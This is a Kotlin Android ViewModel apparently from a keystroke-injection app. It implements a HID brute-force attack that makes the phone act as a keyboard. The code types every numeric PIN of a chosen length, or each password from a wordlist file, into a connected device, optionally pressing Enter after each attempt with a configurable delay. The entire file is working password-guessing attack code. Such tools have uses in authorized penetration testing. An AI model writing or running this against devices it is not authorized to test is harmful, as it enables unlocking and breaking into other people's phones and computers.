package com.example.rabit.ui.automation

import android.app.Application
import android.net.Uri
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.rabit.data.repository.KeyboardRepositoryImpl
import com.example.rabit.domain.repository.KeyboardRepository
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.io.BufferedReader
import java.io.InputStreamReader

class HidBruteForceViewModel(application: Application) : AndroidViewModel(application) {
    private val repository: KeyboardRepository = KeyboardRepositoryImpl(application)
    
    private val _isAttacking = MutableStateFlow(false)
    val isAttacking: StateFlow<Boolean> = _isAttacking.asStateFlow()

    private val _autoEnter = MutableStateFlow(true)
    val autoEnter: StateFlow<Boolean> = _autoEnter.asStateFlow()

    fun toggleAutoEnter() {
        _autoEnter.value = !_autoEnter.value
    }

    private val _currentAttempt = MutableStateFlow("")
    val currentAttempt: StateFlow<String> = _currentAttempt.asStateFlow()

    private val _progress = MutableStateFlow(0f)
    val progress: StateFlow<Float> = _progress.asStateFlow()

    private val _stats = MutableStateFlow(AttackStats())
    val stats: StateFlow<AttackStats> = _stats.asStateFlow()

    private var attackJob: Job? = null

    data class AttackStats(
        val totalAttempts: Int = 0,
        val completedAttempts: Int = 0,
        val speed: String = "0 p/s",
        val estimatedTime: String = "Unknown"
    )

    enum class Charset(val characters: String) {
        NUMERIC("0123456789"),
        LOWERCASE("abcdefghijklmnopqrstuvwxyz"),
        ALPHANUMERIC("abcdefghijklmnopqrstuvwxyz0123456789")
    }

    fun startNumericAttack(length: Int, delayMs: Long, suffix: String = "ENTER") {
        val total = Math.pow(10.0, length.toDouble()).toInt()
        startBruteForce(Charset.NUMERIC, length, total, delayMs, suffix)
    }

    fun startWordlistAttack(uri: Uri, delayMs: Long, suffix: String = "ENTER") {
        if (_isAttacking.value) return
        _isAttacking.value = true
        
        attackJob = viewModelScope.launch(Dispatchers.IO) {
            try {
                val lines = mutableListOf<String>()
                getApplication<Application>().contentResolver.openInputStream(uri)?.use { stream ->
                    BufferedReader(InputStreamReader(stream)).use { reader ->
                        var line: String?
                        while (reader.readLine().also { line = it } != null) {
                            line?.let { lines.add(it) }
                        }
                    }
                }

                val total = lines.size
                _stats.value = AttackStats(totalAttempts = total)

                lines.forEachIndexed { index, password ->
                    if (!isActive) return@launch
                    _currentAttempt.value = password
                    _progress.value = (index + 1).toFloat() / total.toFloat()
                    _stats.value = _stats.value.copy(completedAttempts = index + 1)
                    
                    repository.sendText(password)?.join()
                    if (suffix.isNotBlank()) repository.executeKeyCombo(suffix)
                    
                    delay(delayMs)
                }
            } catch (e: Exception) {
                Log.e("HidBruteForce", "Attack failed", e)
            } finally {
                _isAttacking.value = false
            }
        }
    }

    private fun startBruteForce(
        charset: Charset,
        length: Int,
        total: Int,
        delayMs: Long,
        suffix: String
    ) {
        if (_isAttacking.value) return
        _isAttacking.value = true
        
        attackJob = viewModelScope.launch(Dispatchers.IO) {
            try {
                _stats.value = AttackStats(totalAttempts = total)
                
                for (i in 0 until total) {
                    if (!isActive) break
                    val attempt = i.toString().padStart(length, '0')
                    _currentAttempt.value = attempt
                    _progress.value = (i + 1).toFloat() / total.toFloat()
                    _stats.value = _stats.value.copy(completedAttempts = i + 1)

                    repository.sendText(attempt)?.join()
                    if (suffix.isNotBlank()) repository.executeKeyCombo(suffix)
                    
                    delay(delayMs)
                }
            } finally {
                _isAttacking.value = false
            }
        }
    }

    fun stopAttack() {
        attackJob?.cancel()
        _isAttacking.value = false
    }

    override fun onCleared() {
        super.onCleared()
        stopAttack()
    }
}
